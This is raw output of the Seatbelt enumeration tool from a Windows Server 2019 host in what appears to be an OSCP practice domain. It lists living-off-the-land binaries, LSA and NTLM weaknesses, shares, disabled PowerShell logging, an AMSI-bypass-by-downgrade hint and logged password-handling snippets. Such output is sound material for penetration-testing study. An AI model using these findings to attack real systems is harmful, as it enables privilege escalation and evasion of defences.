Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_0af492edf1dd4d5a\rasautou.exe
Path: C:\Windows\System32\reg.exe
Path: C:\Windows\SysWOW64\reg.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_225a1de282d8e4e1\reg.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.17763.1_none_2caec834b739a6dc\reg.exe
Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_703119e5038999ca\RegAsm.exe
Path: C:\Windows\WinSxS\x86_regasm_b03f5f7f11d50a3a_4.0.15713.0_none_b7de50bc1805c2d0\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
Path: C:\Windows\regedit.exe
Path: C:\Windows\SysWOW64\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_68e49f8161901b63\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_733949d395f0dd5e\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_68e49f8161901b63\f\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_68e49f8161901b63\r\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_733949d395f0dd5e\f\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.17763.168_none_733949d395f0dd5e\r\regedit.exe
Path: C:\Windows\System32\regini.exe
Path: C:\Windows\SysWOW64\regini.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_fd1c265411fa4f7a\regini.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.17763.1_none_0770d0a6465b1175\regini.exe
Path: C:\Windows\System32\Register-CimProvider.exe
Path: C:\Windows\SysWOW64\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_540f87ef441f7cc7\Register-CimProvider.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.17763.1_none_5e64324178803ec2\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_434c448b55fc927a\RegSvcs.exe
Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15713.0_none_8af97b626a78bb80\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
Path: C:\Windows\System32\regsvr32.exe
Path: C:\Windows\SysWOW64\regsvr32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_691d073687ad042e\regsvr32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.17763.1_none_7371b188bc0dc629\regsvr32.exe
Path: C:\Windows\System32\replace.exe
Path: C:\Windows\SysWOW64\replace.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\replace.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\replace.exe
Path: C:\Windows\System32\RpcPing.exe
Path: C:\Windows\SysWOW64\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_12acdc3ec642e317\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_1d018690faa3a512\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_12acdc3ec642e317\f\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_12acdc3ec642e317\r\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_1d018690faa3a512\f\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.17763.404_none_1d018690faa3a512\r\RpcPing.exe
Path: C:\Windows\System32\rundll32.exe
Path: C:\Windows\SysWOW64\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_c8cb3b750313fee0\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_d31fe5c73774c0db\rundll32.exe
Path: C:\Windows\System32\runonce.exe
Path: C:\Windows\SysWOW64\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_0680be8217315dfc\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_10d568d44b921ff7\runonce.exe
Path: C:\Windows\System32\sc.exe
Path: C:\Windows\SysWOW64\sc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_653424fe2cd61e8c\sc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_6f88cf506136e087\sc.exe
Path: C:\Windows\System32\schtasks.exe
Path: C:\Windows\SysWOW64\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_7b0561790d7fc67c\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_855a0bcb41e08877\schtasks.exe
Path: C:\Windows\System32\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.719_none_415f7c814db4ed6f\ScriptRunner.exe
Path: C:\Windows\System32\setupapi.dll
Path: C:\Windows\SysWOW64\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_a9e827df4bc83994\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_b43cd2318028fb8f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_a9e827df4bc83994\f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_a9e827df4bc83994\r\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_b43cd2318028fb8f\f\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.404_none_b43cd2318028fb8f\r\setupapi.dll
Path: C:\Windows\System32\shdocvw.dll
Path: C:\Windows\SysWOW64\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_d83ad76a640f99cc\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_e28f81bc98705bc7\shdocvw.dll
Path: C:\Windows\System32\shell32.dll
Path: C:\Windows\SysWOW64\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_e0fe8fd8979be44b\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_eb533a2acbfca646\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_e0fe8fd8979be44b\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_e0fe8fd8979be44b\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_eb533a2acbfca646\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.737_none_eb533a2acbfca646\r\shell32.dll
Path: C:\Windows\System32\slmgr.vbs
Path: C:\Windows\SysWOW64\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.652_none_ba5407e944d510da\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.652_none_c4a8b23b7935d2d5\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wid_31bf3856ad364e35_10.0.17763.1_none_9870f12fb40ec83a\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\150\Shared\SqlDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\150\Shared\SqlDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.719_none_415f7c814db4ed6f\SyncAppvPublishingServer.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.719_none_415f7c814db4ed6f\SyncAppvPublishingServer.vbs
Path: C:\Windows\System32\syssetup.dll
Path: C:\Windows\SysWOW64\syssetup.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.17763.1_none_619675b2efe03756\syssetup.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.17763.1_none_6beb20052440f951\syssetup.dll
Path: C:\Windows\System32\tttracer.exe
Path: C:\Windows\SysWOW64\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.719_none_d9510f729380a075\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.719_none_e3a5b9c4c7e16270\tttracer.exe
Path: C:\Windows\System32\url.dll
Path: C:\Windows\SysWOW64\url.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_14e2360420cdaa63\url.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_b8c39a806870392d\url.dll
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_950557bc0844e513\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_dcb28e931cc10e19\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
Path: C:\Windows\System32\verclsid.exe
Path: C:\Windows\SysWOW64\verclsid.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_acacbb1b6b9db81c\verclsid.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_b701656d9ffe7a17\verclsid.exe
Path: C:\Program Files\Windows Mail\wab.exe
Path: C:\Program Files (x86)\Windows Mail\wab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_336f47662fbc0a5e\wab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_3dc3f1b8641ccc59\wab.exe
Path: C:\Windows\System32\winrm.vbs
Path: C:\Windows\SysWOW64\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.292_none_3ef4efe232dcfa11\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.292_none_49499a34673dbc0c\winrm.vbs
Path: C:\Windows\System32\wbem\WMIC.exe
Path: C:\Windows\SysWOW64\wbem\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_926fbf4425005e17\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_9cc4699659612012\WMIC.exe
Path: C:\Windows\System32\wscript.exe
Path: C:\Windows\SysWOW64\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.134_none_bd3aabce85fcad18\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.134_none_c78f5620ba5d6f13\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.1_none_73b46e4327098ae1\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.615_none_f7d786b65471adba\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.615_none_f7d786b65471adba\f\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.615_none_f7d786b65471adba\r\wsl.exe
Path: C:\Windows\System32\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.592_none_3b077a2c8bd734e1\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.592_none_3b077a2c8bd734e1\f\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.592_none_3b077a2c8bd734e1\r\WSReset.exe
Path: C:\Windows\System32\xwizard.exe
Path: C:\Windows\SysWOW64\xwizard.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_49b9fab890ad567c\xwizard.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_540ea50ac50e1877\xwizard.exe
Path: C:\Windows\System32\zipfldr.dll
Path: C:\Windows\SysWOW64\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_ecfc1396bad03a6a\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_f750bde8ef30fc65\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_ecfc1396bad03a6a\f\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_ecfc1396bad03a6a\r\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_f750bde8ef30fc65\f\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.107_none_f750bde8ef30fc65\r\zipfldr.dll
Found: 396 LOLBAS

To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 644
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1
  SCENoApplyLegacyAuditPolicy    : 0
  TurnOffAnonymousBlock          : 0
  LsaConfigFlags                 : 0
  RunAsPPL                       : 0
  RunAsPPLBoot                   : 0
====== MappedDrives ======

Mapped Drives (via WMI)

====== McAfeeConfigs ======

====== McAfeeSiteList ======

ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MicrosoftUpdates ======

Enumerating *all* Microsoft updates

ERROR:   [!] Terminating exception running command 'MicrosoftUpdates': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. (Exception from HRESULT: 0x80070422)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at Seatbelt.Commands.Windows.MicrosoftUpdateCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== NamedPipes ======

1688,svchost,atsvc
248,svchost,Ctx_WinStation_API_service
872,svchost,epmapper
1132,svchost,eventlog
    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
2832,vmtoolsd,giTrayPipe513e5e75-69a3-4657-a899-eb3d9787d512
500,wininit,InitShutdown
644,lsass,lsass
924,svchost,LSM_API_service
624,services,ntsvcs
0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
6968,powershell,PSHost.134162531471798483.6968.DefaultAppDomain.powershell
2276,svchost,ROUTER
    SDDL         : O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
624,services,scerpc
2328,svchost,SessEnvPublicRpc
4104,sqlservr,sql\query
4104,sqlservr,SQLLocal\MSSQLSERVER
2676,svchost,srvsvc
248,svchost,TermSrv_API_service
2792,svchost,trkwks
0,Unk,TSVCPIPE-13e848d9-14b0-4ec4-8386-6d7230e98e9b
2816,VGAuthService,vgauth-service
    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
8,svchost,W32TIME_ALT
0,Unk,Winsock2\CatalogChangeListener-1f4-0
0,Unk,Winsock2\CatalogChangeListener-270-0
0,Unk,Winsock2\CatalogChangeListener-284-0
0,Unk,Winsock2\CatalogChangeListener-368-0
0,Unk,Winsock2\CatalogChangeListener-46c-0
0,Unk,Winsock2\CatalogChangeListener-698-0
0,Unk,Winsock2\CatalogChangeListener-918-0
0,Unk,Winsock2\CatalogChangeListener-e90-0
2256,svchost,wkssvc
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\Windows
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           : 
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (Administrator):



    OneNote files (b.martin):



    OneNote files (jenkins):


====== OptionalFeatures ======

State    Name                                               Caption
Enabled  FileAndStorage-Services                            
Enabled  Internet-Explorer-Optional-amd64                   Internet Explorer 11
Enabled  KeyDistributionService-PSH-Cmdlets                 Key Distribution Service PowerShell Cmdlets
Enabled  MediaPlayback                                      Media Features
Enabled  MicrosoftWindowsPowerShell                         Windows PowerShell
Enabled  MicrosoftWindowsPowerShellISE                      Windows PowerShell Integrated Scripting Environment
Enabled  MicrosoftWindowsPowerShellRoot                     Windows PowerShell
Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
Enabled  NetFx4                                             .NET Framework 4.7
Enabled  NetFx4ServerFeatures                               .NET Framework 4.7 Features
Enabled  Printing-Client                                    Windows Server Print Client
Enabled  Printing-Client-Gui                                Windows Server Print Client Management UI
Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
Enabled  Printing-XPSServices-Features                      Microsoft XPS Document Writer
Enabled  RSAT                                               Root node for feature RSAT tools
Enabled  SearchEngine-Client-Package                        Windows Search
Enabled  Server-Core                                        Microsoft-Windows-Server-Core-Package-DisplayName
Enabled  ServerCore-Drivers-General                         Server Core Drivers
Enabled  ServerCore-Drivers-General-WOW64                   Server Core WOW64 Drivers
Enabled  ServerCoreFonts-NonCritical-Fonts-BitmapFonts      Server Core non-critical fonts - (Fonts-BitmapFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-MinConsoleFonts  Server Core non-critical fonts - (Fonts-MinConsoleFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-Support          Server Core non-critical fonts components - (Fonts-Support).
Enabled  ServerCoreFonts-NonCritical-Fonts-TrueType         Server Core non-critical fonts - (Font-TrueTypeFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-UAPFonts         Server Core non-critical fonts - (Fonts-UAPFonts).
Enabled  ServerCore-WOW64                                   Microsoft Windows ServerCore WOW64
Enabled  Server-Drivers-General                             Server Drivers
Enabled  Server-Drivers-Printers                            Server Printer Drivers
Enabled  Server-Gui-Mgmt                                    Microsoft-Windows-Server-Gui-Mgmt-Package-DisplayName
Enabled  Server-Psh-Cmdlets                                 Microsoft Windows ServerCore Foundational PowerShell Cmdlets
Enabled  Server-Shell                                       Microsoft-Windows-Server-Shell-Package-DisplayName
Enabled  SmbDirect                                          SMB Direct
Enabled  Storage-Services                                   
Enabled  SystemDataArchiver                                 System Data Archiver
Enabled  TlsSessionTicketKey-PSH-Cmdlets                    TLS Session Ticket Key Commands
Enabled  Tpm-PSH-Cmdlets                                    Trusted Platform Module Service PowerShell Cmdlets
Enabled  WCF-Services45                                     WCF Services
Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
Enabled  Windows-Defender                                   Windows Defender Antivirus
Enabled  WindowsMediaPlayer                                 Windows Media Player
Enabled  WindowsServerBackupSnapin                          Windows Server Backup SnapIn
Enabled  Xps-Foundation-Xps-Viewer                          XPS Viewer
====== OracleSQLDeveloper ======

====== OSInfo ======

  Hostname                      :  SRV22
  Domain Name                   :  oscp.exam
  Username                      :  OSCP\b.martin
  ProductName                   :  Windows Server 2019 Standard
  EditionID                     :  ServerStandard
  ReleaseId                     :  1809
  Build                         :  17763.737
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  2/22/2026 4:40:43 PM (Total uptime: 00:05:32:25)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  2/22/2026 10:13:09 PM (Local time: 2/22/2026 2:13:09 PM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -08:00:00
  InputLanguage                 :  Japanese
  InstalledInputLanguages       :  US, Japanese, Japanese
  MachineGuid                   :  5135e37b-7588-4409-85de-803169316eb5
====== OutlookDownloads ======

====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.17763.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      : 

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== PowerShellEvents ======

Searching script block logs (EID 4104) for sensitive data.

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : ConvertTo-SecureString -String $CertPassword -AsPlainText -Force

  Context                        : Write-CWarningOnce -Message ('You passed a plain text password to `Initialize-CLcm`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $CertPassword -and $CertPassword -isnot [securestring] )
ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
}
$thumbprint = $null
if( $CertificateID )

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : ConvertTo-SecureString -String $Password -AsPlainText -Force

  Context                        : Write-CWarningOnce -Message ('You passed a plain text password to `Install-CCertificate`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $Password -and $Password -isnot [securestring] )
ConvertTo-SecureString -String $Password -AsPlainText -Force
}
if( $PSCmdlet.ParameterSetName -like 'FromFile*' )
{

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.

  Context                        : .DESCRIPTION
Removes users or groups from a *local* group.
.SYNOPSIS
net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.
So, this function removes users or groups from a *local* group.
If the user or group is not a member, nothing happens.
`Remove-CGroupMember` is new in Carbon 2.0.

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : ConvertTo-SecureString -AsPlainText -Force -String $Password

  Context                        : {
if( $Password -is [string] )
{
ConvertTo-SecureString -AsPlainText -Force -String $Password
}
elseif( $Password -isnot [securestring] )
{

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)

  Context                        : {
if( $PSCmdlet.ParameterSetName -like 'CustomAccount*' -and -not $Credential )
{
net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)
}
else
{

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
  UserId                         : S-1-5-21-318536300-2164503644-2098472648-500
  Match                          : network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.

  Context                        : .DESCRIPTION
Gets the IP addresses in use on the local computer.
.SYNOPSIS
network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.
If you *do* care about network interfaces, then you'll have to do it yourself using the [System.Net.NetworkInformation.NetworkInterface](http://msdn.microsoft.com/en-us/library/System.Net.NetworkInformation.NetworkInterface.aspx) class's [GetAllNetworkInterfaces](http://msdn.microsoft.com/en-us/library/system.net.networkinformation.networkinterface.getallnetworkinterfaces.aspx) static method, e.g.
[Net.NetworkInformation.NetworkInterface]::GetNetworkInterfaces()
.LINK

  TimeCreated                    : 10/9/2024 1:55:57 PM
  EventId                        : 4104
